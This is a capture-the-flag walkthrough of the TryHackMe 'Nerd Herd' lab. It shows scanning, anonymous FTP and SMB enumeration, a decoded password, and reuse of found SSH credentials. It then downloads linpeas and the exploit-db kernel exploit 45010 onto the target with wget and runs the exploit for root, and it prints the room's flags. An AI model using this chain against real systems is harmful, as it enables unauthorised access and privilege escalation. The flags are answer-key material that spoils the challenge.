----
Hack your way into this easy/medium level legendary TV series "Chuck" themed box!
----

![](https://live.staticflickr.com/3444/3381603213_6565128fd5_b.jpg)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/63f7ad45f1bec382a61db8f99ccb723e.png)

### PWN

 Start Machine

_This is the very first vulnerable machine that I've created. So, feel free to share your opinions/advices with me on my_ _**DC: 0xpr0N3rd** (alright maybe for nudges too)  
_

_I've enjoyed developing this box and I hope you enjoy it while solving._

![](https://vignette.wikia.nocookie.net/chuck/images/1/13/Nerd_Herd_assembly.png/revision/latest?cb=20130602172459)  

  

**Hack this machine before nerd herd fellas arrive, happy hacking!!!**

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.175.11 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.175.11:22
Open 10.10.175.11:21
Open 10.10.175.11:139
Open 10.10.175.11:445
Open 10.10.175.11:1337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 12:26 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:26
Completed Parallel DNS resolution of 1 host. at 12:26, 0.04s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:26
Scanning 10.10.175.11 [5 ports]
Discovered open port 445/tcp on 10.10.175.11
Discovered open port 22/tcp on 10.10.175.11
Discovered open port 139/tcp on 10.10.175.11
Discovered open port 21/tcp on 10.10.175.11
Discovered open port 1337/tcp on 10.10.175.11
Completed Connect Scan at 12:26, 0.28s elapsed (5 total ports)
Initiating Service scan at 12:26
Scanning 5 services on 10.10.175.11
Completed Service scan at 12:26, 11.86s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.175.11.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:26
NSE: [ftp-bounce 10.10.175.11:21] PORT response: 500 Illegal PORT command.
Completed NSE at 12:26, 10.90s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:27, 1.97s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 0.00s elapsed
Nmap scan report for 10.10.175.11
Host is up, received user-set (0.28s latency).
Scanned at 2023-05-02 12:26:34 EDT for 26s

PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0c841b36b2a2e111dd6aef427b0dbb43 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYrqlEH/5dR4LGfKThK3BQuCVPxx91asS9FfOewAooNFJf4zsESd/VCHcfQCXEHucZo7+xdceZklC7PwhzmybjkN79iQcd040gw5kg0htMWuVzdzcVFowV0hC1o7Rbze7zLya1B1C105aEoRKVHVeTx0ishoJfJlkJBlx2nKrKWciDYbJQvG+1TxEJaEM4KkmkO31y0L7C3nsdaEd+Z/lNIo6JfbxwrOb6vBonPLS/lZDJdaY0vrdZJ81FRiMbSuUIj3lEtDAZNWBTwXx5kO3fwodw4KbS0ukW5srZX5TLmf/Q/T8ooCnJMLvaksIXKl0r8fjJIx0QucoCwhCTR2o1
|   256 e25d9ee728ead3ddd4cc2086a3df23b8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNSB3jALoSxl/A6Jtpf21NoRfbr8ICR6FpH+bbprQ17LUFUm6pUrhDSx134JBYKLOfFljhNKR57LLS6LAK0bKB0=
|   256 ecbe237ba94c2185bca8db0e7c39de49 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII4VHJRelvecImJNkkZcKdI+vK0Hn1SjMT2r8SaiLiK3
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1337/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: NERDHERD, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   NERDHERD<00>         Flags: <unique><active>
|   NERDHERD<03>         Flags: <unique><active>
|   NERDHERD<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-time: 
|   date: 2023-05-02T16:26:52
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nerdherd
|   NetBIOS computer name: NERDHERD\x00
|   Domain name: \x00
|   FQDN: nerdherd
|_  System time: 2023-05-02T19:26:52+03:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 13484/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 41059/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 37644/udp): CLEAN (Failed to receive data)
|   Check 4 (port 48897/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -59m56s, deviation: 1h43m54s, median: 2s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.13 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.175.11
Connected to 10.10.175.11.
220 (vsFTPd 3.0.3)
Name (10.10.175.11:witty): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||46389|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||45452|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .jokesonyou
-rw-rw-r--    1 ftp      ftp         89894 Sep 11  2020 youfoundme.png
226 Directory send OK.
ftp> get youfoundme.png
local: youfoundme.png remote: youfoundme.png
229 Entering Extended Passive Mode (|||42898|)
150 Opening BINARY mode data connection for youfoundme.png (89894 bytes).
100% |******************************************************************| 89894      176.44 KiB/s    00:00 ETA
226 Transfer complete.
89894 bytes received in 00:00 (122.00 KiB/s)
ftp> cd .jokesonyou
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||43739|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
-rw-r--r--    1 ftp      ftp            28 Sep 14  2020 hellon3rd.txt
226 Directory send OK.
ftp> more hellon3rd.txt
all you need is in the leet

┌──(witty㉿kali)-[~/Downloads]
└─$ exiftool youfoundme.png                   
ExifTool Version Number         : 12.57
File Name                       : youfoundme.png
Directory                       : .
File Size                       : 90 kB
File Modification Date/Time     : 2020:09:11 00:45:43-04:00
File Access Date/Time           : 2023:05:02 12:39:56-04:00
File Inode Change Date/Time     : 2023:05:02 12:39:56-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 894
Image Height                    : 894
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 3543
Pixels Per Unit Y               : 3543
Pixel Units                     : meters
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2010-10-26T08:00:31-07:00
Datemodify                      : 2010-10-26T08:00:31-07:00
Software                        : www.inkscape.org
EXIF Orientation                : 1
Exif Byte Order                 : Big-endian (Motorola, MM)
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
Flashpix Version                : 0100
Owner Name                      : fijbxslz
Image Size                      : 894x894
Megapixels                      : 0.799

Owner Name                      : fijbxslz

view-source:http://10.10.175.11:1337/

<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>.</p>

# Surfin Bird - Bird is the Word

https://www.dcode.fr/vigenere-cipher

ciphertext: fijbxslz , key: BIRDISTHEWORD

easypass

┌──(witty㉿kali)-[~/Downloads]
└─$ smbmap -u anonymous -H 10.10.175.11                       
[+] Guest session   	IP: 10.10.175.11:445	Name: 10.10.175.11                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	nerdherd_classified                               	NO ACCESS	Samba on Ubuntu
	IPC$                                              	NO ACCESS	IPC Service (nerdherd server (Samba, Ubuntu))

┌──(witty㉿kali)-[~/Downloads]
└─$ enum4linux -a 10.10.175.11 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May  2 12:54:23 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.175.11
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.175.11 )============================


[+] Got domain/workgroup name: WORKGROUP


 ================================( Nbtstat Information for 10.10.175.11 )================================

Looking up status of 10.10.175.11
	NERDHERD        <00> -         B <ACTIVE>  Workstation Service
	NERDHERD        <03> -         B <ACTIVE>  Messenger Service
	NERDHERD        <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.175.11 )===================================


[+] Server 10.10.175.11 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.175.11 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ===================================( OS information on 10.10.175.11 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.175.11 from srvinfo: 
	NERDHERD       Wk Sv PrQ Unx NT SNT nerdherd server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 =======================================( Users on 10.10.175.11 )=======================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck	Name: ChuckBartowski	Desc: 

user:[chuck] rid:[0x3e8]

┌──(witty㉿kali)-[~/Downloads]
└─$ smbclient //10.10.175.11/nerdherd_classified --user=chuck 
Password for [WORKGROUP\chuck]: easypass
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 10 21:29:53 2020
  ..                                  D        0  Thu Nov  5 15:44:40 2020
  secr3t.txt                          N      125  Thu Sep 10 21:29:53 2020

		8124856 blocks of size 1024. 3414256 blocks available
smb: \> more secr3t.txt
getting file \secr3t.txt of size 125 as /tmp/smbmore.hAPPP5 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

Ssssh! don't tell this anyone because you deserved it this far:

        check out "/this1sn0tadirect0ry"

Sincerely,
        0xpr0N3rd
<3

http://10.10.175.11:1337/this1sn0tadirect0ry/creds.txt

alright, enough with the games.

here, take my ssh creds:
	
	chuck : th1s41ntmypa5s

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa chuck@10.10.175.11
The authenticity of host '10.10.175.11 (10.10.175.11)' can't be established.
ED25519 key fingerprint is SHA256:4V4PIhnGrI839xlu2pqGA5v5JX8UwkjDWR2IK/ykQeE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.175.11' (ED25519) to the list of known hosts.
chuck@10.10.175.11's password: th1s41ntmypa5s
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

747 packages can be updated.
522 updates are security updates.

Last login: Wed Oct 14 17:03:42 2020 from 22.0.97.11
chuck@nerdherd:~$ id
uid=1000(chuck) gid=1000(chuck) groups=1000(chuck),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
chuck@nerdherd:~$ ls
Desktop    Downloads         Music                Pictures  Templates  Videos
Documents  examples.desktop  nerdherd_classified  Public    user.txt
chuck@nerdherd:~$ cat user.txt 
THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}
chuck@nerdherd:~$ sudo -l
[sudo] password for chuck: 
Sorry, user chuck may not run sudo on nerdherd.

chuck@nerdherd:~$ cat .bash_history

exit
su
exit
su
exit
ifconfig 
clear
ftp localhost
clear
cd /Desk
cd /home/chuck/Desktop/
clear
ftp localhost
service restart ftp
service ftpd restart
why are you looking at my logs????
su 
clear
ftp localhost
restart
reboot


┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.175.11 - - [02/May/2023 13:05:14] "GET /linpeas.sh HTTP/1.1" 200 -

chuck@nerdherd:/$ cd /tmp
chuck@nerdherd:/tmp$ ls
systemd-private-45db4ba770194cb8b773fded38b267e7-colord.service-HUQPlD
systemd-private-45db4ba770194cb8b773fded38b267e7-rtkit-daemon.service-VPkL2o
systemd-private-45db4ba770194cb8b773fded38b267e7-systemd-timesyncd.service-TWRoyN
chuck@nerdherd:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
--2023-05-02 20:05:17--  http://10.8.19.103:1234/linpeas.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                  100%[==========================================>] 808,69K   457KB/s    in 1,8s    

2023-05-02 20:05:19 (457 KB/s) - ‘linpeas.sh’ saved [828098/828098]

chuck@nerdherd:/tmp$ chmod +x linpeas.sh 
chuck@nerdherd:/tmp$ ./linpeas.sh 


╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.4.0-31-generic (buildd@lgw01-16) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2.1) ) #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.1 LTS
Release:	16.04
Codename:	xenial

chuck@nerdherd:/tmp$ uname -a
Linux nerdherd 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
chuck@nerdherd:/tmp$ cat /etc/issue
Ubuntu 16.04.1 LTS 

┌──(witty㉿kali)-[~/Downloads/LinEnum]
└─$ searchsploit Ubuntu 16.04 Local Privilege Escalation
------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                             | linux/local/40054.c
LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation                 | linux/local/41923.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7 | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynam | linux_x86/local/42276.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)           | linux/local/40759.rb
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Esc | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privil | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Pr | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalat | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation    | linux/local/40489.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation             | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                    | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Es | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (K | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Pri | linux/local/47169.c
------------------------------------------------------------------------------------------ ------------------------

┌──(witty㉿kali)-[~/Downloads/LinEnum]
└─$ searchsploit 45010                                  
------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation             | linux/local/45010.c
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(witty㉿kali)-[~/Downloads]
└─$ searchsploit -m 45010
  Exploit: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/45010
     Path: /usr/share/exploitdb/exploits/linux/local/45010.c
    Codes: CVE-2017-16995
 Verified: True
File Type: C source, ASCII text
Copied to: /home/witty/Downloads/45010.c

chuck@nerdherd:/tmp$ which gcc
/usr/bin/gcc

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.175.11 - - [02/May/2023 14:14:36] "GET /45010.c HTTP/1.1" 200 -

chuck@nerdherd:/tmp$ wget http://10.8.19.103:1234/45010.c
--2023-05-02 21:14:38--  http://10.8.19.103:1234/45010.c
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13176 (13K) [text/x-csrc]
Saving to: ‘45010.c’

45010.c             100%[================>]  12,87K  53,5KB/s    in 0,2s    

2023-05-02 21:14:39 (53,5 KB/s) - ‘45010.c’ saved [13176/13176]

chuck@nerdherd:/tmp$ gcc 45010.c -o 45010
chuck@nerdherd:/tmp$ ./45010
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88001fa32500
[*] Leaking sock struct from ffff880019f28000
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88000319fa80
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88000319fa80
[*] credentials patched, launching shell...
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt	
cmon, wouldnt it be too easy if i place the root flag here?


# ls -lah
total 40K
drwx------  5 root root 4,0K Kas  5  2020 .
drwxr-xr-x 24 root root 4,0K Eyl 11  2020 ..
-rw-r--r--  1 root root 3,1K Kas  5  2020 .bash_history
-rw-r--r--  1 root root 3,1K Eki 22  2015 .bashrc
drwx------  2 root root 4,0K Tem 19  2016 .cache
drwxr-xr-x  2 root root 4,0K Eyl 11  2020 .nano
-rw-r--r--  1 root root  148 Ağu 17  2015 .profile
-rw-r--r--  1 root root   62 Eyl 14  2020 root.txt
drwx------  2 root root 4,0K Eyl 11  2020 .ssh
-rw-------  1 root root  511 Eyl 11  2020 .viminfo
# cat .bash_history               
passwd
exit
nano /etc/sudoers
exit
nano /etc/sudoers
exit
clear
nano /etc/sudoers
exit
ls -la
cd /rootls -la
cat root.txt 
nano root.txt 
cd /home/chuck/
ls -la
nano user.txt 
exit
clear
cd /var/www/html 
cd admin/
ls -la
cd css
ls -la
cd ..
cd fonts/
ls -la
cd font-awesome-4.7.0/
ls -la
cd ..
ls -la
rm -rf font-awesome-4.7.0/
ls -la
cd ..
rm -rf fonts/
ls -la
cd css/
ls -la
nano main.css 
cd /root
clear
apt-get install vsftpd
service vsftpd status
clear
sudo adduser anonymous
nano /etc/vsftpd.conf
systemctl restart vsftpd
nano /etc/vsftpd.conf
systemctl restart vsftpd
cd /var
ls -la
mkdir ftp_home
useradd ftpuser
passwd ftpuser
chown ftpuser:ftpuser /var/ftp_home
usermod -d /var/ftp_hpme/ ftpuser
ls -la
cd ftp_home/
ls -la
mkdir test
usermod -s /sbin/nologin ftpuser
cat /etc/passwd | grep ftpuser
systemctl restart vsftpd
cd ..
rm -rf ftp_home/
ls -la
cp /etc/vsftpd.conf /etc/vsftpd.conf.orig
sudo ufw status
ufw allow ftp-data
ufw allow ftp
ufw status
ufw enable
ufw status
mkdir -p /var/ftp/pub
chown nobody:nogroup /var/ftp/pub
echo "test" | sudo tee /var/ftp/pub/test.txt
nano /etc/vsftpd
nano /etc/vsftpd.conf
systemctl restart vsftpd
ls -la
cd ftp/
ls -la
cd pub/
ls -la
rm test.txt 
cp /home/chuck/Desktop/youfoundme.png .
ls -la
cd ..
mkdir .jokesonyou
ls -la
cd .jokesonyou/
cd .jokesonyou
cd ..
mv .jokesonyou/ pub/
ls -la
cd pub/
ls -la
cd .jokesonyou/
touch hellon3rd.txt
nano hellon3rd.txt 
clear
apt install samba
whereis samba
mkdir /home/chuck/sambashare
nano /etc/samba/smb.conf
service smbd restart
service apache2 start
service ssh start
/etc/init.d/apache2 restart
/etc/init.d/apache2 start
systemctl status apache2
systemctl status ssh
cd /var/www/html
ls -la
mkdir this1sn0tadirect0ry
ls -la
cd this1sn0tadirect0ry/
ls -la
touch creds.txt
nano creds.txt 
cat creds.txt 
nano creds.txt 
nano creds.html
ls -la
rm creds.html 
nano creds.txt 
cd ..
cd pu
cd ftp/
cd pub/
ls -la
cp youfoundme.png /home/chuck/Desktop/
ls -la
rm youfoundme.png 
THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}
mv /home/chuck/Downloads/youfoundme.png .
rm youfoundme.png 
mv /home/chuck/Downloads/youfoundme.png .
clear
ufw status
ufw disable
systemctl restart apache2
systemctl restart ssh
smbpasswd -a chuck
systemctl smb restart
systemctl samba restart
systemctl smbx restart
systemctl smbd restart
service smbd restart
ls -la
mv sambashare/ nerdherd_classified
nano /etc/samba/smb.conf
service smbd restart
ls -la
service smbd restart
nano /etc/samba/smb.conf
service smbd restart
ufw allow samba
ls -la
cd nerdherd_classified/
touch test
rm test
touch secr3t.txt
nano secr3t.txt 

exit
cd /root
cat .bash
cat .bash_history 
nano .bash_history 
exit
setxkbmap tr
cd /root
cat .bash_history 
ls -la
cat root.txt 
clear
pwd
rm .bash_history 
wget http://22.0.97.17/.bash_history
ls -la
cat .bash_history 
exit
service ftpd restart
service ftp restart
cat /etc/init.d/
ls -la /etc/init.d
service vsftpd restart
exit
cat /root/.bash_
cat /root/.bash_history 
clear
cd ..
clear
exit

# find / -type f -name "*root.txt*" 2>/dev/null
/root/root.txt
/opt/.root.txt

^C
# cat /opt/.root.txt
nOOt nOOt! you've found the real flag, congratz!

THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}


```

![[Pasted image 20230502114136.png]]

User Flag  

*THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}*

Root Flag  

*THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}*

Bonus Flag

brings back so many memories

*THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}*

[[Tardigrade]]